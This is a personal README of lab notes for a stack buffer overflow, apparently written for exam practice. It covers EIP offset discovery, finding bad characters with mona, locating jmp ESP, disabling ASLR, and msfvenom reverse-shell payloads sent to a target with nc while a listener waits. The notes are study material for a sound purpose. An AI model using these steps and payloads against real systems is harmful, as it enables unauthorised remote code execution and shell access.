# OSC_BoF
This Rep describes my steps for BoF. 


1. To find the EIP offset net to create a pattern with msfvenom 

 /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 2100 > exploit.txt
 -> check the EIP value: example EIP: 43346943
 then use command to find out the offset: 
 /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 2100 -q 42367242
 additional step:  /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 2100 -q Aa0A (first 4 chars of offset to find how many chars until ESP)
 offset = 1812, -> need to fill until then with 1812 Chars
 1. Step in code: #buf = b"A" * OFFSET #junk get to EIP

2. Find bad Characters, send all chars, in hex to File and filter out bad ones: 
3. shortcut with Mona: !mona config -set workingfolder c:\log\%p
   !mona bytearray -> create bytearray.bin
   
   !mona compare -f C:\log\bad-characters-windows-4\bytearray.bin -a 005756C8 (address is where Badchars start, usually EBX?) 
   
   !mona bytearray -cpb "\x00\x06\x0a\x1a\"
   
   !mona compare -f C:\log\bad-characters-windows-4\bytearray.bin -a 005756C8 (address is where Badchars start, usually EBX?) 

4. find a jmp ESP instruction in code, so that we can put in our shellcode 
5. Windows: use mona !mona jmp -r esp -cpb "\x00\x1a" use jump esp instruction, to fin the right address. 
   Linux: need to disable ASLR: 
   echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
   check with: 
   cat /proc/sys/kernel/randomize_va_space
   needs to be 0, 2 means activated
    in ebd, use plugin Optcode searcher and look for ESP - EIP, and first instruction that has jmp ESP
5. take the address of jump instruction and write it backwards, ex: 0x5e9a515e -> EIP="\x5e\x51\x9a\x5e" 
6. new code: #buf = b"A" * OFFSET + EIP   
7. next add 16x NOPs: b"\x90" *16
8. new code: #buf = b"A" * OFFSET + EIP + "\x90" *16
9. create the shellcode with MSFvenom:
       msfvenom -a x86 --platform Windows -p windows/shell_reverse_tcp LHOST=192.168.45.214 LPORT=443 -f py -v buf -b "\x00\x06\x0a\x1a\x3b\xcf
       msfvenom -p windows/exec CMD='cmd.exe' --format c -b "\x00\x06\x0A\x1A\x3B\xCF\x0d\xff" -f raw -o exploit.txt
       msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.119.178 LPORT=443 -o exploit.txt -b "\x00\x0a\x1a"
       msfvenom -a x86 --platform Linux -p linux/x86/shell_reverse_tcp LHOST=192.168.45.221 LPORT=443 -f py -v buf -b "\x00\x0a\x0d\x1a\x20\x43\x75\x9e\xbc"
9. write final: 
                f = open("/home/kali/Downloads/exploit.txt", "wb")
                f.write(buf)
                f.close()
 10. send to server: 
 cat exploit.txt - | nc 192.168.221.52 5000
and set nc listner: nc -nvlp 443



xxd -g 1 exploit.txt -> to read out the chars 

objdump -d execution-flow-windows.exe | grep flag




